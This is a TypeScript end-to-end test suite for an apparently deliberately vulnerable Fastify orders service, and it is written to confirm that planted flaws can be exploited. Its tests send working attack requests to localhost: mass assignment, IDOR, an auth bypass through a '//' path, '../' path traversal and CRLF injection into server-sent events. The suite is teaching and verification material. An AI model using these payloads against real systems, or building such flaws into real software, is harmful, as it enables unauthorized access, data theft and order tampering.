import axios from 'axios';
import * as http from 'http';

/*
 * orders exploit suite — e2e proof that each intentional vulnerability in the
 * mestjs Fastify backend (apps/orders) is actually reproducible against the
 * running service. GREEN = the exploit works, not "the app is secure".
 * Full write-up and remediation: docs/orders.md. Do not copy these patterns.
 */

// Low-level GET that does NOT canonicalise the path (axios/Node would collapse
// the leading '//'), so we can hit Fastify with a non-canonical url and trigger
// the authorization-before-canonicalisation bypass (CVE-2026-2293).
function rawGet(rawPath: string, headers: Record<string, string> = {}) {
  return new Promise<{ status: number; body: string }>((resolve, reject) => {
    const req = http.request(
      { host: 'localhost', port: 3002, method: 'GET', path: rawPath, headers },
      (res) => {
        let body = '';
        res.on('data', (c) => (body += c));
        res.on('end', () =>
          resolve({ status: res.statusCode ?? 0, body })
        );
      }
    );
    req.on('error', reject);
    req.end();
  });
}

describe('orders (fastify) — intentional vulnerability exploits', () => {
  // SEC-014 — mass assignment: client sets server-owned fields.
  // @proves MEST-VULN-ORDERS-MASSASSIGN
  it('mass assignment: POST body can set status=paid and total=0', async () => {
    const res = await axios.post('/orders', {
      status: 'paid',
      total: 0,
      itemId: 999,
    });
    expect(res.status).toBe(201);
    // A safe app would compute status/total server-side; here the client wins.
    expect(res.data.status).toBe('paid');
    expect(res.data.total).toBe(0);
  });

  // SEC-017 — IDOR: read any order by id with no ownership check.
  // @proves MEST-VULN-ORDERS-IDOR
  it('idor: /orders/mine/:id returns another user\'s order', async () => {
    const res = await axios.get('/orders/mine/2');
    expect(res.status).toBe(200);
    expect(res.data.userId).toBe(2); // not the caller — no owner check
  });

  // CVE-2026-2293 — Fastify path-normalization auth bypass (CWE-551).
  // @proves MEST-VULN-ORDERS-AUTHBYPASS
  it('auth bypass: non-canonical //orders/admin/report skips the guard', async () => {
    // Canonical path: the guard denies a non-admin (403/401/forbidden).
    const canonical = await rawGet('/orders/admin/report', { 'x-role': 'guest' });
    expect([401, 403]).toContain(canonical.status);

    // Non-canonical path: Fastify canonicalises AFTER the guard ran, so the
    // same guest reaches the admin handler and reads the report.
    const bypass = await rawGet('//orders/admin/report', { 'x-role': 'guest' });
    expect(bypass.status).toBe(200);
    expect(bypass.body).toContain('revenue');
  });

  // Path traversal on the invoice download.
  // @proves MEST-VULN-ORDERS-TRAVERSAL
  it('path traversal: ?file=../ escapes the invoices directory', async () => {
    const ok = await axios.get('/orders/1/invoice', {
      params: { file: 'sample.txt' },
    });
    expect(ok.status).toBe(200);
    expect(ok.data).toContain('SAMPLE INVOICE');

    // Climb out of invoices/ — a contained impl would reject the '..' with a
    // 4xx; here the read is attempted outside the base dir instead.
    const escaped = await rawGet('/orders/1/invoice?file=../../package.json');
    expect(escaped.status).not.toBe(400);
    expect(escaped.status).not.toBe(403);
  });

  // CVE-2026-35515 — SSE injection: CRLF in a label corrupts the event stream.
  // @proves MEST-VULN-ORDERS-SSEINJECT
  it('sse injection: a label with CRLF injects extra SSE fields', async () => {
    const payload = encodeURIComponent('x\nevent: hijacked\ndata: injected');
    const chunk = await new Promise<string>((resolve, reject) => {
      const req = http.request(
        {
          host: 'localhost',
          port: 3002,
          method: 'GET',
          path: `/orders/1/status?label=${payload}`,
          headers: { accept: 'text/event-stream' },
        },
        (res) => {
          let body = '';
          res.on('data', (c) => {
            body += c;
            // Wait for the first real SSE event (data: ... line), not the first
            // empty keep-alive/flush byte, then abort.
            if (body.includes('tick') || body.includes('hijacked')) {
              req.destroy();
              resolve(body);
            }
          });
          res.on('end', () => resolve(body));
        }
      );
      req.on('error', (e) => {
        if ((e as NodeJS.ErrnoException).code === 'ECONNRESET') return;
        reject(e);
      });
      req.end();
    });
    // The decoded newline survived into the stream, so the single data field
    // we sent now spans multiple SSE lines — event/data injection.
    expect(chunk).toContain('hijacked');
  }, 10000);
});
